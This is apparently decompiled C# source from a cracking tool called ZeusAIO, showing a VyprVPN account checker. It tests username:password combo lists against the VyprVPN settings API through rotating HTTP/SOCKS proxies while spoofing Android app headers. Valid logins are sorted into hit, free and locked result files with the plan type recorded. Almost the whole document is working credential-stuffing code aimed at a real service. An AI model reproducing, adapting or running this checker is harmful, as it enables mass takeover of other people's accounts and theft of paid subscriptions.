// Decompiled with JetBrains decompiler
// Type: VyperVpn.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using TunnelBear;
using ZeusAIO;

namespace VyperVpn
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static string genIP()
    {
      Random random = new Random();
      return random.Next(1, (int) byte.MaxValue).ToString() + "." + random.Next(0, (int) byte.MaxValue).ToString() + "." + random.Next(0, (int) byte.MaxValue).ToString() + "." + random.Next(0, (int) byte.MaxValue).ToString();
    }

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.AllowAutoRedirect = false;
              httpRequest.Cookies = (CookieStorage) new CookieDictionary();
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.UserAgent = "okhttp/2.3.0";
              httpRequest.AddHeader("username", s[0]);
              httpRequest.AddHeader("password", s[1]);
              httpRequest.AddHeader("X-GF-Agent", "VyprVPN Android v2.19.0.7702. (56aa5dfd)");
              httpRequest.AddHeader("X-GF-PRODUCT", "VyprVPN");
              httpRequest.AddHeader("X-GF-PRODUCT-VERSION", "2.19.0.7702");
              httpRequest.AddHeader("X-GF-PLATFORM", "Android");
              httpRequest.AddHeader("X-GF-PLATFORM-VERSION", "6.0");
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string source = httpRequest.Get("https://api.goldenfrog.com/settings").ToString();
              if (source.Contains("confirmed\": true"))
              {
                string str = Check.Parse(source, "\"account_level_display\": \"", "\"");
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - VYPERVPN] " + s[0] + ":" + s[1] + " | Plan: " + str, Color.Green);
                Export.AsResult("/Vypervpn_hits", s[0] + ":" + s[1] + " | Plan: " + str);
                return false;
              }
              if (!source.Contains("invalid username or password"))
              {
                if (source.Contains("vpn\": null"))
                {
                  ++mainmenu.frees;
                  if (mainmenu.p1 == "2")
                    Colorful.Console.WriteLine("[FREE - VYPERVPN] " + s[0] + ":" + s[1], Color.OrangeRed);
                  Export.AsResult("/Vypervpn_frees", s[0] + ":" + s[1]);
                  return false;
                }
                if (!source.Contains("locked"))
                {
                  ++mainmenu.frees;
                  if (mainmenu.p1 == "2")
                    Colorful.Console.WriteLine("[HIT {LOCKED} - VYPERVPN] " + s[0] + ":" + s[1], Color.Red);
                  Export.AsResult("/Vypervpn_locked", s[0] + ":" + s[1]);
                  return false;
                }
                if (source.Contains("Your browser didn't send a complete request in time"))
                  ;
              }
              else
                break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

    private static string Parse(string source, string left, string right) => source.Split(new string[1]
    {
      left
    }, StringSplitOptions.None)[1].Split(new string[1]
    {
      right
    }, StringSplitOptions.None)[0];
  }
}
